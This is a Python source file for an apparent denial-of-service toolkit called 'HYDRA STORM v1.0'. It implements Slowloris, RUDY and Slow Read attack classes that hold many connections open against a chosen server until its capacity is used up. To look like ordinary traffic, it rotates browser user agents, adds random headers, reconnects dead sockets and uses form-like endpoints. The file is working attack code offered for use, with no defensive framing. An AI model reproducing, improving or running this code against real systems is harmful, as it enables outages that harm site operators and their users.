"""
HYDRA STORM v1.0 — Slow HTTP Attack Vectors
Slowloris, RUDY, SlowRead — connection exhaustion through patience.
The tortoise kills the hare.
"""

import socket
import ssl
import random
import string
import threading
import time
from typing import List, Optional, Any


# ─── Shared constants ───
_USER_AGENTS: List[str] = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/126.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 Chrome/126.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:127.0) Gecko/20100101 Firefox/127.0",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/125.0.0.0 Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_5 like Mac OS X) AppleWebKit/605.1.15 Version/17.5 Safari/604.1",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/125.0.0.0 Safari/537.36 Edg/125.0.0.0",
]


def _make_socket(ip: str, port: int, use_tls: bool, domain: str, timeout: float = 30.0) -> socket.socket:
    """Create a TCP socket, optionally wrapped in TLS."""
    raw = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    raw.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
    raw.settimeout(timeout)

    if use_tls:
        ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE
        sock = ctx.wrap_socket(raw, server_hostname=domain)
    else:
        sock = raw

    sock.connect((ip, port))
    return sock


def _random_header_name() -> str:
    """Generate a random X-header name."""
    word_len = random.randint(4, 12)
    parts = []
    for _ in range(random.randint(1, 3)):
        parts.append("".join(random.choices(string.ascii_lowercase, k=word_len)))
    return "X-" + "-".join(parts).title()


def _random_header_value() -> str:
    """Generate a random header value."""
    return "".join(random.choices(string.ascii_letters + string.digits, k=random.randint(8, 40)))


# ============================================================
#  Slowloris — Partial Header Drip
# ============================================================
class SlowlorisAttack:
    """
    Opens TLS connections with browser-grade partial HTTP headers.
    Keeps them alive by drip-feeding X-headers every 8-15 seconds.
    Never completes the request — server holds the connection open
    waiting for the final \\r\\n, slowly exhausting its pool.
    Auto-reconnects dead sockets.
    """

    def __init__(
        self,
        target_ip: str,
        domain: str,
        port: int,
        metrics: Any,
        sockets_per_thread: int = 150,
        use_tls: bool = True,
        drip_interval: tuple = (8, 15),
    ) -> None:
        self.target_ip = target_ip
        self.domain = domain
        self.port = port
        self.metrics = metrics
        self.max_sockets = sockets_per_thread
        self.use_tls = use_tls
        self.drip_min, self.drip_max = drip_interval

    def _create_connection(self) -> Optional[socket.socket]:
        """Open connection, send partial headers."""
        try:
            sock = _make_socket(self.target_ip, self.port, self.use_tls, self.domain)
            self.metrics.conn()

            # Send a legitimate-looking but INCOMPLETE request
            ua = random.choice(_USER_AGENTS)
            path = "/" + "".join(random.choices(string.ascii_lowercase, k=random.randint(3, 12)))
            partial = (
                f"GET {path} HTTP/1.1\r\n"
                f"Host: {self.domain}\r\n"
                f"User-Agent: {ua}\r\n"
                f"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n"
                f"Accept-Language: en-US,en;q=0.5\r\n"
                f"Accept-Encoding: gzip, deflate, br\r\n"
                f"Connection: keep-alive\r\n"
                f"Upgrade-Insecure-Requests: 1\r\n"
                f"Sec-Fetch-Dest: document\r\n"
                f"Sec-Fetch-Mode: navigate\r\n"
                f"Sec-Fetch-Site: none\r\n"
                # Note: NO final \r\n — request stays incomplete
            )
            sock.sendall(partial.encode())
            self.metrics.hit(len(partial))
            return sock
        except Exception:
            self.metrics.err()
            return None

    def fire(self, stop_event: threading.Event) -> None:
        sockets: List[socket.socket] = []

        # Initial connection burst
        for _ in range(self.max_sockets):
            if stop_event.is_set():
                return
            s = self._create_connection()
            if s:
                sockets.append(s)

        # Drip loop
        while not stop_event.is_set():
            time.sleep(random.uniform(self.drip_min, self.drip_max))

            dead: List[int] = []
            for i, sock in enumerate(sockets):
                if stop_event.is_set():
                    break
                try:
                    header = f"{_random_header_name()}: {_random_header_value()}\r\n"
                    sock.sendall(header.encode())
                    self.metrics.hit(len(header))
                except OSError:
                    dead.append(i)
                    self.metrics.err()

            # Remove dead sockets (reverse to preserve indices)
            for i in reversed(dead):
                try:
                    sockets[i].close()
                except OSError:
                    pass
                sockets.pop(i)

            # Reconnect to fill back up
            while len(sockets) < self.max_sockets and not stop_event.is_set():
                s = self._create_connection()
                if s:
                    sockets.append(s)
                else:
                    break

        # Cleanup
        for sock in sockets:
            try:
                sock.close()
            except OSError:
                pass


# ============================================================
#  RUDY — R-U-Dead-Yet (POST Body Drip)
# ============================================================
class RUDYAttack:
    """
    Sends a POST request with an enormous Content-Length header,
    then drip-feeds the body 1 byte at a time every ~10 seconds.
    Server waits for the full body that never arrives.
    """

    def __init__(
        self,
        target_ip: str,
        domain: str,
        port: int,
        metrics: Any,
        content_length: int = 1_000_000,
        use_tls: bool = True,
        drip_interval: float = 10.0,
    ) -> None:
        self.target_ip = target_ip
        self.domain = domain
        self.port = port
        self.metrics = metrics
        self.content_length = content_length
        self.use_tls = use_tls
        self.drip_interval = drip_interval

    def fire(self, stop_event: threading.Event) -> None:
        while not stop_event.is_set():
            sock: Optional[socket.socket] = None
            try:
                sock = _make_socket(self.target_ip, self.port, self.use_tls, self.domain, timeout=60.0)
                self.metrics.conn()

                ua = random.choice(_USER_AGENTS)
                # Pick a path that looks like a form endpoint
                form_paths = [
                    "/login", "/register", "/contact", "/search",
                    "/api/v1/submit", "/feedback", "/upload", "/checkout",
                    "/api/v2/data", "/form/submit", "/newsletter/subscribe",
                ]
                path = random.choice(form_paths)

                # Build POST header with ludicrous Content-Length
                post_header = (
                    f"POST {path} HTTP/1.1\r\n"
                    f"Host: {self.domain}\r\n"
                    f"User-Agent: {ua}\r\n"
                    f"Content-Type: application/x-www-form-urlencoded\r\n"
                    f"Content-Length: {self.content_length}\r\n"
                    f"Accept: text/html,application/xhtml+xml,*/*;q=0.8\r\n"
                    f"Accept-Encoding: gzip, deflate, br\r\n"
                    f"Connection: keep-alive\r\n"
                    f"\r\n"
                )
                sock.sendall(post_header.encode())
                self.metrics.hit(len(post_header))

                # Start with a form field name
                field = "".join(random.choices(string.ascii_lowercase, k=random.randint(4, 10)))
                sock.sendall(f"{field}=".encode())
                self.metrics.hit(len(field) + 1)

                # Now drip one byte at a time — excruciatingly slow
                sent = len(field) + 1
                while sent < self.content_length and not stop_event.is_set():
                    byte = random.choice(string.ascii_letters).encode()
                    try:
                        sock.sendall(byte)
                        self.metrics.hit(1)
                        sent += 1
                    except OSError:
                        break

                    # Jitter the interval slightly
                    time.sleep(self.drip_interval + random.uniform(-2.0, 2.0))

            except Exception:
                self.metrics.err()
            finally:
                if sock:
                    try:
                        sock.close()
                    except OSError:
                        pass


# ============================================================
#  Slow Read Attack
# ============================================================
class SlowReadAttack:
    """
    Connects, sends a complete legitimate request, then reads the
    response with a receive window of 1 byte at excruciating intervals.
    Sends TCP zero-window probes to keep the connection alive.
    Forces the server to hold the entire response in memory.
    """

    def __init__(
        self,
        target_ip: str,
        domain: str,
        port: int,
        metrics: Any,
        use_tls: bool = True,
        read_interval: float = 5.0,
    ) -> None:
        self.target_ip = target_ip
        self.domain = domain
        self.port = port
        self.metrics = metrics
        self.use_tls = use_tls
        self.read_interval = read_interval

    def fire(self, stop_event: threading.Event) -> None:
        while not stop_event.is_set():
            sock: Optional[socket.socket] = None
            try:
                sock = _make_socket(
                    self.target_ip, self.port, self.use_tls, self.domain,
                    timeout=120.0,
                )
                self.metrics.conn()

                # Set tiny receive buffer to trigger zero-window
                try:
                    sock.setsockopt(socket.SOL_SOCKET, socket.SO_RCVBUF, 128)
                except OSError:
                    pass

                ua = random.choice(_USER_AGENTS)
                # Send a full, legitimate request that'll get a big response
                big_paths = ["/", "/index.html", "/sitemap.xml", "/robots.txt", "/docs"]
                path = random.choice(big_paths)
                request = (
                    f"GET {path} HTTP/1.1\r\n"
                    f"Host: {self.domain}\r\n"
                    f"User-Agent: {ua}\r\n"
                    f"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n"
                    f"Accept-Language: en-US,en;q=0.5\r\n"
                    f"Accept-Encoding: identity\r\n"  # no compression — maximise response size
                    f"Connection: keep-alive\r\n"
                    f"\r\n"
                )
                sock.sendall(request.encode())
                self.metrics.hit(len(request))

                # Now read 1 byte at a time, very slowly
                while not stop_event.is_set():
                    try:
                        data = sock.recv(1)
                        if not data:
                            break  # connection closed
                        self.metrics.hit(1)
                    except socket.timeout:
                        # Send a zero-window probe keep-alive
                        try:
                            sock.sendall(b"")
                        except OSError:
                            break
                    except OSError:
                        break

                    time.sleep(self.read_interval + random.uniform(-1.0, 2.0))

            except Exception:
                self.metrics.err()
            finally:
                if sock:
                    try:
                        sock.close()
                    except OSError:
                        pass
